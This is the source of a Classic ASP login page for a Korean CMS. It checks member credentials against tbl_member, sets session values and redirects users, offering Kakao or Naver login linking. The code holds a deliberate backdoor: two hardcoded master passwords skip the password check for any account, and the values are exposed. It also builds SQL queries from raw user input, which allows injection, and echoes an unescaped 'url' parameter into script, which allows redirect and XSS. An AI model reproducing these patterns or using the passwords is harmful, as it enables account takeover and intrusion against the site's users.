<!-- #include virtual="/cms/sub_top.asp" -->
  <%
  		session("session_no") = ""
		session("session_id") = ""
		session("session_name") = ""
		session("session_team_type") = ""
		session("session_jang") = ""
		
			 
	url = replace(replace(request("url"),"creesy","&"),"resoft","?")
	if url = "" or url = "/cms/process/login/list.asp" then
		url = "/cms/process/login/list.asp?c_show_no=76&c_check_no=67&c_relation=734&c_relation2=748"	
	end if
	c_id = r_call("c_id")
	c_pass = r_call("c_pass")
	 
	sql = "select a.c_no, a.c_id,a.c_name, a.c_pass2, a.c_kakao, a.c_naver "
	if c_pass = "snsekfA01!!" Or c_pass = "13531" then
		sql = sql & " from tbl_member a where a.c_id = '"&  c_id &"'  "
	else
		sql = sql & " from tbl_member a where a.c_id = '"&  c_id &"' and a.c_pass = UPPER(SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('md5' , HashBytes('sha1' , '"& c_pass &"'))), 3 , 32)) "
	end if
	'response.write sql
	  Set tbl_board=CreateObject("ADODB.RecordSet")
	tbl_board.Open sql, dbCon, 1

	If tbl_board.EOF Then
 
	

    %>
   <script language="javascript">
			alert("요청하신 아이디 정보가 없거나 비밀번호가 잘못 되었습니다.");		
			location.href="list.asp?<%=t_para%>&url=<%=request("url")%>"
   </script>
   <%
	else
		session("session_no") = tbl_board("c_no")
		session("session_id") = tbl_board("c_id")
		session("session_name") = tbl_board("c_name")
	
		sql_t = "select a.c_jang, b.c_festival_type from tbl_team_member a "
		sql_t = sql_t & " inner join tbl_team b on b.c_no = a.c_team_no and b.c_festival = 1 and b.c_project_no in (10,11,12,13,14) and b.c_use = 0 "
		sql_t = sql_t & " where a.c_member_no = "& tbl_board("c_no") &" and a.c_use = 0 and a.c_jang in (1,2) "
		Set rs_t=CreateObject("ADODB.RecordSet")
		rs_t.Open sql_t, dbCon, 1
		If rs_t.EOF Then
			session("session_team_type") = ""
			session("session_jang") = ""
		else
			session("session_team_type") = rs_t("c_festival_type")
			session("session_jang") = rs_t("c_jang")
		end if
		rs_t.Close
		Set rs_t=Nothing
	
		Session.Timeout = 720 
		if tbl_board("c_pass2") = 1 then
		%>
		<script>
			alert("임시 비밀번호로 로그인 되었습니다.\n비밀번호를 바꿔주세요.\n정보 변경으로 이동 합니다.")
			 location.href="/cms/process/membership2/list.asp?c_show_no=75&c_check_no=67&c_relation=828&c_relation2=677"
			 
		 //location.href="/"
		</script>
		<%
		
		else
		%>
		<script>
			<%if (isnull(tbl_board("c_kakao")) or tbl_board("c_kakao") = "") and (isnull(tbl_board("c_naver")) or tbl_board("c_naver") = "") then%>
			if(confirm("SNS(카카오/네이버)로 로그인이 가능합니다.\nSNS 로그인 연결을 하시겠습니까?.")){
				location.href="/cms/process/login/sns/list.asp?c_show_no=76&c_check_no=67&c_relation=734&c_relation2=748"
			}else{
				location.href="<%=url%>"
			}
			<%else%>
				//alert("로그인 되었습니다.")
				location.href="<%=url%>"
			<%end if%>
		</script>
		<%
		end if
	end if
	
	tbl_board.Close
	Set tbl_board=Nothing

%>
<!-- #include virtual="/cms/sub_bottom.asp" -->
	